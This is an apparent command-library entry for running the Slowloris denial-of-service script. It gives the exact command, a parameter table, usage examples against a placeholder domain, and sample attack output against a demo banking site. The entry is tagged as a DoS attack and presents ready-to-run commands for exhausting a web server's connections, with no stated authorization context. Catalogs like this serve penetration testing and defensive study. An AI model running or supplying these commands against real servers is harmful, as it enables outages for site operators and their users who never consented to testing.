---
id: 111bf9af-e7ed-4849-8ff5-1ab8781ff226
name: python-run-slowloris-attack
type: command
executor: bash
data: python3 slowloris.py $_TARGET_URL -s $_SOCKET_COUNT
output: |-
  [06-09-2020 23:39:23] Attacking https://demo.testfire.net with 300 packets.
  [06-09-2020 23:39:23] Creating sockets...
  [06-09-2020 23:39:57] Sending keep-alive headers... socket count: 0
  [06-09-2020 23:40:32] Sending keep-alive headers... socket count: 0
  [06-09-2020 23:41:21] Sending keep-alive headers... socket count: 0
  [06-09-2020 23:41:51] Sending keep-alive headers... socket count: 0
  [06-09-2020 23:42:22] Sending keep-alive headers... socket count: 0
  [06-09-2020 23:43:03] Sending keep-alive headers... socket count: 0
  [06-09-2020 23:44:43] Sending keep-alive headers... socket count: 0
  [06-09-2020 23:45:13] Sending keep-alive headers... socket count: 0
  [06-09-2020 23:46:53] Sending keep-alive headers... socket count: 0
  [06-09-2020 23:47:16] Sending keep-alive headers... socket count: 0
created_at: '2020-09-06T18:17:44.926621+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - dos
  - attack
verified: true
validated: true
---

# Python Run Slowloris Attack

## Command

```bash
python3 slowloris.py $_TARGET_URL -s $_SOCKET_COUNT
```

## Description

This command executes the Slowloris Python script to launch a DoS attack by creating multiple incomplete HTTP connections to the target URL, using the specified number of sockets to exhaust server resources.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The target website URL (e.g., https://example.com) | Yes |
| -s | Flag to specify the number of sockets/connections | Yes |
| $_SOCKET_COUNT | Number of sockets to use (e.g., 300) | Yes |
| -p | Optional: Target port (default 80) | No |
| -S | Optional: Use SSL (for HTTPS) | No |
| -H | Optional: HTTP timeout in seconds (default 5) | No |
| -t | Optional: Timeout for the attack | No |

## Examples

### Basic Usage

```bash
python3 slowloris.py https://example.com -s 300
```

### Advanced Usage

```bash
python3 slowloris.py https://example.com -s 500 -p 443 -S
```

## Expected Output

```
[06-09-2020 23:39:23] Attacking https://demo.testfire.net with 300 packets.
[06-09-2020 23:39:23] Creating sockets...
[06-09-2020 23:39:57] Sending keep-alive headers... socket count: 0
[06-09-2020 23:40:32] Sending keep-alive headers... socket count: 0
[06-09-2020 23:41:21] Sending keep-alive headers... socket count: 0
[06-09-2020 23:41:51] Sending keep-alive headers... socket count: 0
[06-09-2020 23:42:22] Sending keep-alive headers... socket count: 0
[06-09-2020 23:43:03] Sending keep-alive headers... socket count: 0
[06-09-2020 23:44:43] Sending keep-alive headers... socket count: 0
[06-09-2020 23:45:13] Sending keep-alive headers... socket count: 0
[06-09-2020 23:46:53] Sending keep-alive headers... socket count: 0
[06-09-2020 23:47:16] Sending keep-alive headers... socket count: 0
```

The socket count may remain at 0 if connections are dropped; monitor target responsiveness separately.

## Related

- [[procedures/http-dos-using-slowloris]]
- [[tools/slowloris]]
